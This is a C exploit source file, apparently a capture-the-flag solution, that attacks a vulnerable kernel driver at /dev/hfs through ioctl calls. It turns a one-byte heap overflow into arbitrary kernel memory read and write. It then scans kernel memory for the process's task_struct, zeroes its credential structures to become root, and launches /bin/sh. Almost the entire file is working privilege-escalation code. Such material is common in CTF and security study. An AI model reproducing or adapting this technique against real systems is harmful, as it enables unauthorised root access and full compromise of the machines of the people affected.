/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit && gzip -kf exploit && base64 exploit.gz
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <sys/prctl.h>
#include "utils.h"

#define LOG(...) printf(__VA_ARGS__)

extern struct trap_frame_32 tf;
extern void (*commit_creds)(int);
extern int (*prepare_kernel_cred)(int);

int fd;

int add(int idx, uint64_t size) {
    int64_t arg[2];
    arg[0] = idx;
    arg[1] = size;
    assert(size <= 0x800);
    int ret = ioctl(fd, 0xABCD0001, &arg);
    return ret;
}

int del(int idx) {
    int64_t arg[1];
    arg[0] = idx;
    int ret = ioctl(fd, 0xABCD0002, &arg);
    return ret;
}

int rd(int idx, uint64_t size, uint64_t ptr) {
    int64_t arg[3];
    arg[0] = idx;
    arg[1] = size;
    arg[2] = ptr;
    int ret = ioctl(fd, 0xABCD0003, &arg);
    return ret;
}

int wr(int idx, uint64_t size, uint64_t ptr) {
    int64_t arg[3];
    arg[0] = idx;
    arg[1] = size;
    arg[2] = ptr;
    int ret = ioctl(fd, 0xABCD0004, &arg);
    return ret;
}

uint64_t rd_payload;
uint64_t wr_payload;

void read_mem(uint64_t addr, uint64_t size, uint64_t buffer) {
    uint64_t *payload = wr_payload;
    payload[0] = 0x0;
    payload[1] = addr;
    payload[2] = 0x1000;
    wr(5, 0x18, wr_payload);
    rd(0, size, buffer);
}

void write_mem(uint64_t addr, uint64_t size, uint64_t buffer) {
    uint64_t *payload = wr_payload;
    payload[0] = 0x0;
    payload[1] = addr;
    payload[2] = size;
    wr(5, 0x18, wr_payload);
    wr(0, size, buffer);
}

#define TASK_COMM_LEN 16
char comm[TASK_COMM_LEN];
uint64_t kernel_heap_base = 0xffff880000000000;

void find_task_struct(unsigned long *cred, unsigned long *real_cred)
{
    unsigned long offset = 0;
    unsigned long k_addr = kernel_heap_base;
    unsigned long *start_buffer = NULL;
    uint64_t buffer = (uint64_t)malloc(0x1000);
    int ret;


    while(1) {
        memset(buffer, 0, 0x1000);
        k_addr = kernel_heap_base + offset;
        if(k_addr < kernel_heap_base) {
            break;

        }

        read_mem(k_addr, 0x1000, buffer);

        start_buffer = (unsigned long *)buffer;

        start_buffer = memmem(start_buffer, 0x1000, comm, sizeof(comm));

        if(start_buffer != NULL) {
            if ((start_buffer[-2] > kernel_heap_base) && (start_buffer[-1] > kernel_heap_base)) {
                *real_cred = start_buffer[-2];
                *cred = start_buffer[-1];

                printf("[+] Found comm signature %s at %p [+]\n", start_buffer, (unsigned long *) (k_addr + ((char *)start_buffer - buffer)));
                printf("[+] real_cred: %p [+]\n", *real_cred);
                printf("[+] cred: %p [+]\n", *cred);

                break;

            }

        }
        offset += 0x1000;

    }

}

int overwrite_creds(int fd, unsigned long cred_addr, unsigned long real_cred_addr) {
    void *ptr = malloc(0x38);
    memset(ptr, 0, 0x38);
    write_mem(cred_addr, 0x38, ptr);
    write_mem(real_cred_addr, 0x38, ptr);

    printf("...\n");
    if(getuid() != 0) {
        return -1;

    }
    return 0;
}
void gen_rand_str(char *str, unsigned int len) {
    unsigned int i;
    for ( i = 0; i < (len - 1); i++   )
        str[i] = (rand() % (0x7e - 0x20)) + 0x20;
    str[len - 1] = 0;
}

int main(int argc, char const* argv[]) {
    srand(time(NULL));
    gen_rand_str(comm, sizeof(comm));
    printf("Generated comm signature: '%s'\n", comm);
    int ret = prctl(PR_SET_NAME, comm);
    if (ret < 0) {
        die("prctl");

    }
    fd = open("/dev/hfs", O_RDWR);
    if (fd < 0) {
        die("open baby");
    }

    rd_payload = (uint64_t)mmap(0xdeadbeef000, 0x1000, PROT_WRITE|PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    wr_payload = (uint64_t)mmap(0xcafebabe000, 0x1000, PROT_WRITE|PROT_READ, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    if((int64_t)rd_payload < 0 || (int64_t)wr_payload < 0) {
        die("mmap");
    }

    add(0x10, 0x20);
    add(0x11, 0x20);
    add(0x12, 0x20);
    add(0, 0x20);
    add(2, 0x20);
    add(3, 0x20);
    add(4, 0x20);

    del(2);

    memset(wr_payload, 'A', 0x20);
    ((uint8_t *)wr_payload)[0x20] = 0x20;
    wr(0, 0x21, wr_payload);

    add(0x5, 0x20);

    // begin
    void *ptr = malloc(0x20);
    ((uint64_t *)ptr)[0] = 0xdeadbeefdeadbeef; 
    write_mem(0xffff8800001d9438, 0x8, ptr);
    read_mem(0xffffffffa0002360, 0x20, ptr);
    hexdump(ptr, 0x20);

    uint64_t cred, real_cred;
    find_task_struct(&cred, &real_cred);

    /* An error occurred */
    if(cred == 0 && real_cred == 0) {
        printf("[x] Could not find comm field exiting...\n");
        exit(-1);

    }

    /* We overwrite our cred fields and pop a root shell */
    if(overwrite_creds(fd, cred, real_cred) == 0) {
        printf("[!!!] Successfully escalated privileges, you get a root shell....\n");
        system("/bin/sh");

    }

    puts("bye!");

    return 0;
}

